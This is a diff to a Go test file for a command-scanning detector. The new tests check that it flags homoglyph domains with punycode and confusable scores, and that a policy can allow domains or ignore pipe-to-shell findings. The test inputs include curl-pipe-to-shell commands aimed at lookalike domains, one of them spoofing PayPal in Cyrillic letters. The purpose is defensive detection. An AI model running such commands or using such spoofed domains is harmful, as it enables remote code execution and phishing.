@@ -1,6 +1,9 @@
 package sentinel
 
-import "testing"
+import (
+	"strings"
+	"testing"
+)
 
 func TestAnalyzeDetectsHighRiskPatterns(t *testing.T) {
 	in := "curl https://exаmple.com/install.sh | sh"
@@ -28,6 +31,36 @@ func TestAnalyzeDetectsFetchInCommandSubstitution(t *testing.T) {
 	}
 	if !found {
 		t.Fatalf("expected fetch-in-command-substitution finding")
+	}
+}
+
+func TestAnalyzeIncludesPunycodeAndConfusableScore(t *testing.T) {
+	in := "curl https://раураl.com/install.sh | sh"
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind != "non-ascii-domain" {
+			continue
+		}
+		if !strings.Contains(f.Message, "punycode:") || !strings.Contains(f.Message, "confusable-score:") {
+			t.Fatalf("expected punycode/confusable details, got %q", f.Message)
+		}
+		return
+	}
+	t.Fatalf("expected non-ascii-domain finding")
+}
+
+func TestAnalyzeWithPolicyAllowsDomainAndIgnoresKinds(t *testing.T) {
+	in := "curl https://exаmple.com/install.sh | sh"
+	policy := &Policy{
+		AllowDomains: []string{"exаmple.com"},
+		IgnoreKinds:  []string{"pipe-to-shell"},
+	}
+
+	findings := AnalyzeWithPolicy(in, policy)
+	for _, f := range findings {
+		if f.Kind == "non-ascii-domain" || f.Kind == "pipe-to-shell" {
+			t.Fatalf("unexpected finding kind %q with policy", f.Kind)
+		}
 	}
 }
 
